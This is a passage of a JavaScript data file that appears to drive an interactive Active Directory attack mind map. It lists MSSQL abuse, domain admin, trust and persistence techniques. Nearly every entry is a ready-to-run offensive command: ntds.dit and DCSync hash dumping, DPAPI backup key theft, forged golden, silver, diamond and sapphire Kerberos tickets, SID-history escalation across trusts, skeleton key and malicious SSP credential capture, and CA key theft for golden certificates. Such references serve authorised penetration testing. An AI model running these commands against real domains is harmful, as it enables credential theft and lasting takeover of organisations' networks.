            "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p   # BloodHound: who is SQL admin",
            "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
          ],
          branches: [
            { label: "enum_db" },
            { label: "enable_xp_cmdshell → xp_cmdshell <cmd>", outcomes: [{ label: "Low Access", color: "#c3b4de" }] },
            { label: "enum_impersonate → exec_as_user <user> / exec_as_login <login>", outcomes: [{ label: "MSSQL", color: "#9ca3af" }] },
            { label: "xp_dir_tree <ip>", outcomes: [{ label: "COERCE SMB", color: "#ffe14a" }] },
            { label: "trustlink → sp_linkedservers → use_link", outcomes: [{ label: "MSSQL", color: "#9ca3af" }, { label: "Trust", color: "#8faa6a" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "domain-admin",
      title: "Domain Admin",
      color: "#e0242a",
      tag: "Own the domain",
      desc: "You have Domain Admin (or DCSync rights). Dump the whole directory and grab the domain backup keys for total, persistent access.",
      techniques: [
        {
          id: "da-ntds",
          title: "Dump ntds.dit",
          theory: null,
          cve: null,
          desc: "Extract every account hash from the domain database.",
          cmds: [
            "nxc smb <dc_ip> -u <user> -p <password> -d <domain> --ntds",
            "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
            'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q   # then: secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract',
            "msf> windows/gather/credentials/domain_hashdump",
            "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
            "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>"
          ],
          outcomes: [{ label: "Lateral move", color: "#9ca3af" }, { label: "Crack hash", color: "#e8912e" }],
          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the dumped hashes offline" }]
        },
        {
          id: "da-backup-keys",
          title: "Grab backup keys",
          theory: null,
          cve: null,
          desc: "Fetch the domain DPAPI backup key (PVK) to decrypt any user's DPAPI secrets domain-wide.",
          cmds: [
            "donpapi collect -H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk"
          ],
          outcomes: [{ label: "Credentials", color: "#4ade80" }],
          moveTo: []
        }
      ]
    },

    {
      id: "trusts",
      title: "Trusts",
      color: "#6b8e4e",
      tag: "Cross-domain / forest",
      desc: "Enumerate trust relationships and abuse them to move between domains and forests — trust keys, SID history, golden tickets, and cross-forest ACLs.",
      techniques: [
        {
          id: "tr-enum",
          title: "Enumeration",
          theory: { label: "Domain & Forest Trusts", url: "theory/2026-08-18-trusts.html" },
          cve: null,
          desc: "Map the trust relationships and gather the domain SIDs you will need.",
          cmds: [
            "nltest.exe /trusted_domains",
            "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
            "Get-DomainTrust -Domain <domain>",
            "Get-DomainTrustMapping",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
            "sharphound.exe -c trusts -d <domain>   # MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
            "Get-DomainSID -Domain <domain>; Get-DomainSID -Domain <target_domain>",
            "lookupsid.py -domain-sids <domain>/<user>:<password>@<dc> 0"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "tr-child-parent",
          title: "Child → Parent (intra-forest)",
          theory: { label: "Domain & Forest Trusts", url: "theory/2026-08-18-trusts.html" },
          cve: null,
          desc: "Escalate from a child domain to the forest root using the trust key or the child krbtgt, adding the Enterprise Admins SID (-519) via SID history.",
          cmds: [],
          branches: [
            { label: "Trust key", cmds: [
              "mimikatz lsadump::trust /patch",
              "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
              "secretsdump.py -just-dc-user '<parent_domain>$' '<domain>/<user>:<password>@<dc_ip>'",
              "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser"
            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
            { label: "Golden ticket", cmds: [
              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-519 /ptt",
              "raiseChild.py <child_domain>/<user>:<password>",
              "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser"
            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
            { label: "Unconstrained delegation", note: "Coerce the parent DC onto the child DC.", outcomes: [{ label: "Unconstrained delegation", color: "#26bd8a" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "tr-parent-child",
          title: "Parent → Child",
          theory: { label: "Domain & Forest Trusts", url: "theory/2026-08-18-trusts.html" },
          cve: null,
          desc: "Same techniques as Child → Parent, applied in the other direction.",
          cmds: [],
          outcomes: [],
          moveTo: []
        },
        {
          id: "tr-external",
          title: "External / forest trust",
          theory: { label: "Domain & Forest Trusts", url: "theory/2026-08-18-trusts.html" },
          cve: null,
          desc: "Abuse a two-way or one-way trust: password reuse, foreign group memberships, SID history (where SID filtering allows), and cross-forest ADCS / unconstrained delegation.",
          cmds: [],
          branches: [
            { label: "Password reuse across the trust", outcomes: [{ label: "Lateral move (creds/pth)", color: "#9ca3af" }] },
            { label: "Foreign group and users", cmds: [
              'MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p',
              'MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p'
            ], outcomes: [{ label: "ACL", color: "#3b9ee5" }] },
            { label: "SID history on B — golden ticket", cmds: [
              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
              "ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> fakeuser"
            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
            { label: "SID history on B — trust ticket", cmds: [
              "secretsdump.py -just-dc-user 'domainB$' '<domainA>/<user>:<password>@<dc_a>'",
              "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> -spn krbtgt/<domain_a> fakeuser"
            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
            { label: "ADCS abuse — unconstrained delegation", note: "Coerce dc_b onto dc_a, then abuse ADCS across the trust.", outcomes: [{ label: "Unconstrained delegation", color: "#26bd8a" }, { label: "AD CS", color: "#c026d3" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "tr-mssql-links",
          title: "MSSQL links",
          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-abuse.html" },
          cve: null,
          desc: "Linked SQL servers ignore the AD trust boundary — crawl them to execute across domains.",
          cmds: [
            "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
            "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>   # trustlink -> sp_linkedservers -> use_link"
          ],
          outcomes: [{ label: "MSSQL", color: "#9ca3af" }],
          moveTo: []
        }
      ]
    },

    {
      id: "persistence",
      title: "Persistence",
      color: "#c8862e",
      tag: "Keep access",
      desc: "Techniques to keep privileged access after compromise. Most require Domain Admin or the krbtgt / CA key — use only where authorised, and remember to clean up.",
      techniques: [
        {
          id: "pe-add-da",
          title: "Add a Domain Admin",
          theory: null,
          cve: null,
          desc: "Add an account to Domain Admins (noisy — easily detected).",
          cmds: [
            'net group "domain admins" myuser /add /domain'
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-golden",
          title: "Golden ticket",
          theory: null,
          cve: null,
          desc: "Forge TGTs with the krbtgt key — valid for any user until krbtgt is rotated twice.",
          cmds: [
            "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> anyuser",
            'mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /aes256:<krbtgt_aes256> /ptt"'
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-silver",
          title: "Silver ticket",
          theory: null,
          cve: null,
          desc: "Forge a service ticket with a service/computer account key — grants access to that one service without touching a DC.",
          cmds: [
            'mimikatz "kerberos::golden /sid:<domain-sid> /domain:<domain> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"',
            "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <service> anyuser"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-dsrm",
          title: "Directory Service Restore Mode (DSRM)",
          theory: null,
          cve: null,
          desc: "Enable the DSRM local admin of a DC to log on over the network with its (dumpable) hash.",
          cmds: [
            'PowerShell New-ItemProperty "HKLM\\System\\CurrentControlSet\\Control\\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD'
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-skeleton",
          title: "Skeleton Key",
          theory: null,
          cve: null,
          desc: "Patch LSASS on a DC so every account also accepts a master password (in memory only).",
          cmds: [
            'mimikatz "privilege::debug" "misc::skeleton" "exit"   # master password: mimikatz'
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-ssp",
          title: "Custom SSP",
          theory: null,
          cve: null,
          desc: "Register a malicious Security Support Provider to log every plaintext credential.",
          cmds: [
            'mimikatz "privilege::debug" "misc::memssp" "exit"',
            "C:\\Windows\\System32\\kiwissp.log"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-golden-cert",
          title: "Golden certificate",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "Steal the CA private key and forge certificates for any account indefinitely.",
          cmds: [
            "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
            "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-diamond",
          title: "Diamond ticket",
          theory: null,
          cve: null,
          desc: "Modify a legitimate TGT's PAC with the krbtgt key — stealthier than a golden ticket.",
          cmds: [
            "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' anyuser"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-sapphire",
          title: "Sapphire ticket",
          theory: null,
          cve: null,
          desc: "Request a ticket while impersonating a privileged user via S4U, keeping a legitimate PAC.",
          cmds: [
            "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-dcshadow",
          title: "DCShadow",
          theory: null,
          cve: null,
          desc: "Register a rogue DC to push directory changes (e.g. add SID history or a primary group) that replicate without normal logging.",
          cmds: [],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pe-acl",
          title: "ACL manipulation",
          theory: null,
          cve: null,
          desc: "Plant durable rights (DCSync, GenericAll, AdminSDHolder) so access can be re-established later.",
          cmds: [],
          outcomes: [],
          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "grant yourself abusable rights for later" }]
        }
      ]
    }
  ]
};
